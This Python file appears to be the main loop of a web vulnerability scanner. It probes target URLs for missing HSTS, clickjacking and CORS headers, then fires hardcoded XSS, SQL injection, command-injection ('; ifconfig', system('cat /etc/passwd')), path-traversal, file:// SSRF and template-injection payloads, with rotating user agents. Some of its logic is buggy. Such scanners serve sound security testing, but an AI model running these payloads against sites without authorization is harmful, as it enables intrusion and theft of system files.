from urllib import parse as urlparse
import http.cookiejar
from parametizer.params import parametizer, parametizer2
from scanners.scan_xss import xss, xss_params
from scanners.scan_lfi import lfi, lfi_params
from scanners.scan_sqli import sqli, sqli_params
from parametizer.core.save_it import save_output
import sys,os ,requests
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
import random
from scanners.scan_idor import idor
from scanners.scan_rce import rce, rce_params
from scanners.scan_redirect import redirect, redirect_params
from scanners.scan_lfi import lfi, lfi_params
from scanners.scan_ssrf import ssrf, ssrf_params
from scanners.scan_ssti import ssti, ssti_params
import random
import signal

user_agents = [
 "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
 "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
 "Mozilla/3.01 (Macintosh; PPC)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",  
 "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
 "Opera/8.00 (Windows NT 5.1; U; en)",  
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
]

user_agent = random.choice (user_agents)


def all_list(l,c,cl,h,x,lf,s,i,r,rc,sr,sst,output,fname,o,vulnerables_urls,op,params,threads):   
 indice=0
 while indice < len(l):
     linea=l[indice]
     try:
         print()
         print('---------------------')
         print("\033[1;36m" + linea + '\033[0;m')
         print('---------------------')
         print()
         if 'http://' in linea:
             pass
         elif 'https://' in linea:
             for line in linea:
                 linea = linea.replace('https://', 'http://')
         else:
             linea = 'http://' + linea
         try:
             req=requests.get(linea, timeout=10.0) #Opens the url
             headers=req.headers 
         except URLError as e:
             for line in linea:
                 linea = linea.replace('http://', 'https://')
             try:    
                 req=requests.get(linea,timeout=10.0)
                 headers=req.headers
             except:        
                 print(f'\033[1;31{req.status_code} [?] open Url Error\033[0m')
                 indice+=1
                      
         #forms = br.forms() #Finds all the forms present in webpage
         
         
         if h:
                if 'strict-transport-security' not in headers:
                    print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mNot force HSTS\033[0m')
                    vulnerables_urls.append('****************** VULNERABLE TO HSTS: *********************')
                    vulnerables_urls.append(linea)      
                else:
                    print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mHSTS is OK\033[0m')  
            
         if cl:
                if 'x-frame-options' not in headers:
                    if 'content-security-policy' not in headers:
                        print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mvulnerable to Clickjacking\033[0m')
                        vulnerables_urls.append('****************** VULNERABLE TO CLICKJACKING: *********************')
                        vulnerables_urls.append(linea)
                    else:
                        print ('\033[1;31m[-]\033[0m '  + linea + ' \033[1;31mis not vulnerable to Clickjacking\033[0m')
                else:
                    print ('\033[1;31m[-]\033[0m '  + linea + ' \033[1;31mis not vulnerable to Clickjacking\033[0m')
            
         if c:    
                    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
            ('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br'), ('Origin','https://evil.com')]
                    
                    req=requests.get(linea,headers=headers,timeout=50)
                    if 'access-control-allow-origin' in headers:
                        if 'https://evil.com' in headers:
                            print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mis vulnerable to Cors\033[0m')
                            vulnerables_urls.append('****************** VULNERABLE TO CORS: *********************') 
                            vulnerables_urls.append(linea)                           
                        else:
                            print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mis not vulnerable to Cors\033[0m')
                    else:
                     print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mis not vulnerable to Cors\033[0m')
     except:
         print()
         print("\033[1;36m"+" CLOSE PROGRAM " + '\033[0;m')
         indice=len(l)
         pass      
    
     try:                  
         if x:
             uri=[]
             wordlist=['"><script>confirm(1)</script>','<h1>NELUXMATIZER</h1>']
             parametizer(linea,output,threads)
             try:
                 with open(output, "r") as f:
                     for v in f.readlines():
                         v = v.strip()
                         if v == "" or v.startswith("#"):
                             pass
                         uri.append(v)
                 if op:
                     xss_params(uri,params,threads)
                 else:                                             
                     print()        
                     print('\033[1;33mTest xss for default payload:\033[0m')       
                     xss(uri,wordlist,vulnerables_urls,threads)           
             except: 
                  pass
         if s:
             uri=[]
             wordlist=["%27"]
             parametizer(linea,output,threads)   
             try:
                 with open(output, "r") as f:
                     for q in f.readlines():
                         q = q.strip()
                         if q == "" or q.startswith("#"):
                             pass
                         uri.append(q)
                 if op:
                     sqli_params(uri,params,threads)
                 else:                                     
                     print()        
                     print('\033[1;33mTest sqli for default payload:\033[0m')
                     print()        
                     sqli(uri,wordlist,vulnerables_urls,threads)           
             except: 
                  pass
         if i and op:
             uri=[]
             wordlist=['']   
             parametizer(linea,output,threads)
             try:
                 with open(output, "r") as f:
                     for j in f.readlines():
                         j = j.strip()
                         if j == "" or j.startswith("#"):
                             pass
                         uri.append(j)                    
                     print()        
                     print('\033[1;33mSearch idor parameters:\033[0m')
                     print()        
                     idor(uri,wordlist,vulnerables_urls,threads)           
             except: 
                  pass
    
         if rc:
             uri=[]
             wordlist=['| ipconfig /all','; ipconfig /all','& ipconfig /all','| ifconfig',
             '& ifconfig', '; ifeconfig','&& ifconfig','system("cat /etc/passwd");','system("cat /etc/passwd");'
             ]
             parametizer(linea,output,threads)
             try:
                 with open(output, "r") as f:
                     for y in f.readlines():
                         y = y.strip()
                         if y == "" or v.startswith("#"):
                             pass
                         uri.append(y)
                 if op:
                     rce_params(uri,params,threads)
                 else:                                             
                     print()        
                     print('\033[1;33mTest rce for default payload:\033[0m')       
                     rce(uri,wordlist,vulnerables_urls,threads)           
             except: 
                  pass

         if r: 
             uri=[]
             wordlist=['////google.com/','////google.com/','https:///google.com/','/https:google.com','<>javascript:alert(1);','http:///////////google.com']
             parametizer(linea,output,threads)
             try:
                 with open(output, "r") as f:
                         for m in f.readlines():
                             m = m.strip()
                             if m == "" or m.startswith("#"):
                                 pass
                             uri.append(m)                             
                 if op:
                         redirect_params(uri,params,threads)
                 else:                                           
                         print()        
                         print('\033[1;33mTest redirect for default payload:\033[0m')       
                         redirect(uri,wordlist,vulnerables_urls,threads)           
             except:  
                 pass
    
         if sr:
             uri=[]
             wordlist=['file:///etc/passwd','file://\/\/etc/passwd','netdoc:///etc/passwd']   
             parametizer(linea,output)
             try:
                 with open(output, "r") as f:
                     for w in f.readlines():
                         w = w.strip()
                         if w == "" or w.startswith("#"):
                             pass
                         uri.append(w)
                 if op:
                     ssrf_params(uri,params,threads)
                 else:                                     
                     print()        
                     print('\033[1;33mTest SSRF for default payloads:\033[0m')
                     print()        
                     ssrf(uri,wordlist,vulnerables_urls,threads)           
             except: 
                  pass

         if lf:
             uri=[]
             wordlist=['../../../../../../../../../../../../../../../../../../../../../../etc/passwd']   
             parametizer(linea,output,threads)
             try:    
                 with open(output, "r") as f:
                     for z in f.readlines():
                         z = z.strip()
                         if z == "" or z.startswith("#"):
                             pass
                         uri.append(z)            
                 if op:
                     lfi_params(uri,params,threads)
                 else:
                     print()        
                     print('\033[1;33mTest lfi for default payload:\033[0m')
                     print()        
                     lfi(uri,wordlist,vulnerables_urls,threads)           
             except: 
                  pass

         if sst:
             uri=[]
             wordlist=["<%= File.open('/etc/passwd').read %>","${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}"]   
             parametizer(linea,output,threads)
             try:
                 with open(output, "r") as f:
                     for k in f.readlines():
                         k = k.strip()
                         if k == "" or k.startswith("#"):
                             pass
                         uri.append(k)            
                 if op:
                     ssti_params(uri,params,threads)
                 else:
                     print()        
                     print('\033[1;33mTest ssti for default payloads:\033[0m')
                     print()        
                     ssti(uri,wordlist,vulnerables_urls,threads)           
             except: 
                  pass
     except:
         print()
         print("\033[1;36m"+" CLOSE PROGRAM " + '\033[0;m')
         indice=len(l)
         pass      
           
      
     if o:
         save_output(vulnerables_urls,fname,linea)    
     if op:
         save_output(params,fname,linea)              
     indice+= 1


